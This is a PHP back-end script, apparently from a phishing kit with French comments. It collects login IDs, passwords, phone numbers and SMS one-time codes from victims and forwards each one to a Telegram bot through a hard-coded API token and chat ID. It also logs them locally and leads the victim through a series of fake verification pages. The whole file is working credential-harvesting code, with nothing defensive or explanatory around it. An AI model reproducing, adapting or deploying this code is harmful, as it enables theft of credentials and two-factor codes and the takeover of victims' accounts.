<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// === CONFIG TELEGRAM ===
function telegram_send($message) {
    $api_key  = '7275654860:AAF-1jh2m9_YLiajYieHBUCzUPF-a_VyUnc';
    $chat_id  = '6590534450';
    $url = 'https://api.telegram.org/bot' . $api_key .
           '/sendMessage?chat_id=' . $chat_id .
           '&text=' . urlencode($message) .
           '&parse_mode=HTML';

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}

// === HELPERS ===
function get_user_ip() {
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}
function get_user_browser() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
}
function safe_write_log($path, $text) {
    if (!is_dir(dirname($path))) mkdir(dirname($path), 0755, true);
    file_put_contents($path, $text . PHP_EOL, FILE_APPEND | LOCK_EX);
}

$LSG = substr(md5(rand()), 0, 17);
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

// === 1) LOGIN ===
if ($method === 'POST' && !empty($_POST['user_id']) && !empty($_POST['Hidden1'])) {
    $user_id_raw = (string) $_POST['user_id'];
    $pwd_raw     = (string) $_POST['Hidden1'];

    $_SESSION['user_id'] = $user_id_raw;
    $_SESSION['pwd']     = $pwd_raw;

    // Envoi Telegram
    telegram_send("[LOGIN] ID: {$user_id_raw} | Pass: {$pwd_raw} | IP: ".get_user_ip()." | UA: ".get_user_browser());

    // Log local
    safe_write_log(__DIR__ . '/../logs/submissions.log', "[LOGIN] ID: {$user_id_raw} | Pass: {$pwd_raw} | IP: ".get_user_ip());

    header("Location: mobile.php?lsg=" . urlencode($LSG));
    exit();
}

// === 2) TELEPHONE ===
if ($method === 'POST' && isset($_POST['tel'])) {
    $tel_raw = trim((string) $_POST['tel']);
    if ($tel_raw !== '') {
        $_SESSION['tel'] = $tel_raw;

        telegram_send("[TEL] User: {$_SESSION['user_id']} | Tel: {$tel_raw} | IP: ".get_user_ip());
        safe_write_log(__DIR__ . '/../logs/submissions.log', "[TEL] {$tel_raw}");

        header("Location: sms.php?lsg=" . urlencode($LSG));
        exit();
    } else {
        header("Location: mobile.php?lsg=" . urlencode($LSG));
        exit();
    }
}

// === 3) SMS ===
if ($method === 'POST' && isset($_POST['sms'])) {
    $sms_raw = trim((string) $_POST['sms']);
    if ($sms_raw !== '') {
        $_SESSION['sms'] = $sms_raw;

        telegram_send("[SMS] User: {$_SESSION['user_id']} | SMS: {$sms_raw} | IP: ".get_user_ip());
        safe_write_log(__DIR__ . '/../logs/submissions.log', "[SMS] {$sms_raw}");

        header("Location: passecur.php?lsg=" . urlencode($LSG));
        exit();
    } else {
        header("Location: sms.php?lsg=" . urlencode($LSG));
        exit();
    }
}

// Par défaut → page 1
header("Location: index.php?lsg=" . urlencode($LSG));
exit();
